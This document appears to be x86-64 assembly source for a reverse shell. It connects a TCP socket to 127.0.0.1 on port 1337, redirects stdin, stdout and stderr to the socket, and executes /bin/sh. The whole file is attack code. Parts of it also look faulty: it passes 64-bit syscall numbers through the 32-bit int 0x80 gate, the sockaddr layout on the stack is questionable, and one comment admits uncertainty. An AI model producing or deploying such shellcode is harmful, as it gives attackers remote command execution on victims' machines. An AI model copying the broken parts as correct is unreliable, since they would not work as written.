global _start

section .text

_start:
    ; SOCKET
    mov eax, 41   ; SYS_SOCKET = 41
    mov edi, 2    ; socket family AF_INET = 2
    mov esi, 1    ; SOCK_STREAM = 1
    mov edx, 0    ; protocol = 0
    int 0x80
    mov r9d, eax   ; sockfd saved

    ; CONNECT
    mov eax, 42   ; SYS_CONNECT = 42
    mov edi, r9d   ; sockfd
    
        ; sockarrd structure creation
        mov rbx, 0x7f000001 ;IP addres localhost
        bswap rbx ; swaping to network byte order
        push rbx
        mov rbx, 0x539 ; 1337 port
        xchg bl, bh ; swaping to network byte order
        push bx 
        push word 0x02  ; pushing AF_INET=2
    
    mov esi, esp    ; sockarrd structure addres from stack
    mov edx, 16  ; sizeof(serv_addr) ???
    int 0x80

    ; Duplicate file descriptors for stdin, stdout, and stderr
    mov eax, 33  ; SYS_DUP2 = 33
    mov edi, r9d ; old file descriptor
    mov esi, 0   ; socfd
    int 0x80

    mov eax, 33  ; SYS_DUP2 = 33
    mov edi, r9d ; old file descriptor
    mov esi, 1   ; socfd
    int 0x80

    mov eax, 33  ; SYS_DUP2 = 33
    mov edi, r9d ; old file descriptor
    mov esi, 2   ; socfd
    int 0x80

    ; RUN SHELL
    mov eax, 59  ; SYS_EXECVE = 59
    lea edi, [shell]
    xor esi, esi ; NULL, const char *const argv[]("//bin/sh", "//bin/sh", 0)
    xor edx, edx ; NULL, const char *const envp[] (0 or 0x00)
    int 0x80


section .rodata
    shell db "/bin/sh", 0